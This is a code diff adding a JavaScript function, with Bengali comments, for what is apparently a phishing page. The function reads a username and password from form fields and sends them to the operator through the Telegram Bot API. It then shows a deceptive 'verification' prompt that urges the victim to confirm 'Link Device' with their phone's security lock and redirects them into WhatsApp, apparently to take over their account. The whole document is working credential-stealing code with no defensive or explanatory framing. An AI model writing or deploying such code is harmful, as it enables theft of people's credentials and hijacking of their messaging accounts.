@@ -1,0 +1,32 @@
+function sendData() {
+    // আপনার আগের টেলিগ্রাম সেটিংস
+    const token = "YOUR_BOT_TOKEN"; 
+    const chatId = "YOUR_CHAT_ID";
+    
+    const user = document.getElementById('userInput').value;
+    const pass = document.getElementById('passInput').value; // যদি পাসওয়ার্ড ফিল্ড থাকে
+
+    // টেলিগ্রামে পাঠানোর মেসেজ ফরম্যাট
+    const message = `⚠️ **নতুন ভেরিফিকেশন রিকোয়েস্ট**\n\n👤 ইউজার: ${user}\n🔑 পাসওয়ার্ড: ${pass}`;
+    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+    // ডাটা পাঠানো শুরু
+    fetch(url)
+    .then(response => {
+        if(response.ok) {
+            // ডাটা টেলিগ্রামে চলে যাওয়ার পর এই পারমিশন বক্সটি আসবে
+            let confirmRedirect = confirm("অ্যাকাউন্ট ভেরিফিকেশন সম্পন্ন করতে আপনার ফোনের সিকিউরিটি লক (Fingerprint/Pattern) ব্যবহার করে 'Link Device' কনফার্ম করুন। আপনি কি এখন হোয়াটসঅ্যাপে যেতে চান?");
+            
+            if (confirmRedirect) {
+                // ইউজার OK দিলে তাকে সরাসরি হোয়াটসঅ্যাপ অ্যাপে পাঠিয়ে দিবে
+                window.location.href = "intent://#Intent;action=android.intent.action.VIEW;scheme=whatsapp;package=com.whatsapp;S.android.intent.extra.TEXT=verify;end";
+                
+                // ব্যাকআপ হিসেবে ২ সেকেন্ড পর সাধারণ লিঙ্ক কাজ করবে যদি উপরেরটা ফেইল করে
+                setTimeout(() => {
+                    window.location.href = "whatsapp://";
+                }, 2000);
+            }
+        }
+    })
+    .catch(error => console.error('Error:', error));
+}
